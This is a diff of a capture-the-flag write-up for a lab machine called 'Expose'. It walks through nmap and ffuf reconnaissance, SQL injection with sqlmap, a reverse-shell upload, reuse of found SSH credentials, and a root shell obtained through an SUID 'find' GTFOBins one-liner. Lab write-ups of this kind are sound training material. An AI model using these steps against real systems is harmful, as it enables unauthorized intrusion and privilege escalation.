@@ -1,7 +1,11 @@
 To check my VPN connection was working I started with "ping -c4 10.10.116.11". Everything seems to be working fine so let's start.
-I ran "sudo nmap -sS -p- 10.10.116.111" to get an initial understanding of what ports were open on the target.
+I ran 
+````
+sudo nmap -sS -p- 10.10.116.111
+````
+to get an initial understanding of what ports were open on the target.
 
-{
+````
 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-07 15:51 EEST
 Nmap scan report for 10.10.116.111
 Host is up (0.075s latency).
@@ -14,11 +18,12 @@ PORT     STATE SERVICE
 1883/tcp open  mqtt
 
 Nmap done: 1 IP address (1 host up) scanned in 39.58 seconds
-}
+````
 
 
-Refined my command a bit, "nmap -sVC -p21,22,53,1337,1883 10.10.116.111" to find versions of the services running.
-{
+Refined my command a bit
+````
+nmap -sVC -p21,22,53,1337,1883 10.10.116.111
 PORT     STATE SERVICE                 VERSION
 21/tcp   open  ftp                     vsftpd 2.0.8 or later
 | ftp-syst:
@@ -95,12 +100,15 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 24.93 seconds
-}
+````
 
 So there is FTP, SSH, DNS domain, waste p2p encrypted file sharing software, and MQTT which is a home automation protocol running.
 FTP server allows anonymous login without a password so let's start there. There are no files but the welcome message is "220 Welcome to the Expose Web Challenge.".
 Went to "http://10.10.116.111:1337" with the browser and got a plank page with "EXPOSED" in it. Let's use ffuf to try to find some directories.
-"ffuf -w /usr/share/wordlists/dirb/big.txt -u http://10.10.116.111:1337/FUZZ" found "/admin, /admin_101, /javascript, /phpmyadmin & /server-status".
+````
+ffuf -w /usr/share/wordlists/dirb/big.txt -u http://10.10.116.111:1337/FUZZ
+````
+found "/admin, /admin_101, /javascript, /phpmyadmin & /server-status".
 
 "/admin, /admin_101 & /phpmyadmin" all have login pages but "/admin" states "Is this the right admin portal?". Testing "/admin" login does not really do anything so let's look at the "/admin_101" next.
 Used burp to proxy the request to a file for sqlmap to test for injection vulnerabilities. 
@@ -135,9 +143,9 @@ The site says "File uploaded successfully! Maybe look in source code to see the 
 I start a listener port the port in the reverse shell and execute our reverse shell by just clicking the file and we got our shell!
 
 I looked at the folder I landed in but there was nothing. Checked home folders of "ubuntu" and "zeamkish". In zeamkish folder was a file named "ssh_creds.txt"!
-Lets try them for ssh "ssh zeamkish@10.10.116.111" and we are in as zeamkish.
+Let's try them for ssh "ssh zeamkish@10.10.116.111" and we are in as zeamkish.
 
-I upleaded "linpeas.sh" to help with enumeration. There is a uncommon binary with suid bit.
+I uploaded "linpeas.sh" to help with enumeration. There is an uncommon binary with suid bit.
 -rwsr-x--- 1 root zeamkish 313K Feb 18  2020 /usr/bin/find
 
 I had a look at gtfobins and found that you can spawn a privileged shell with: "./find . -exec /bin/sh -p \; -quit"
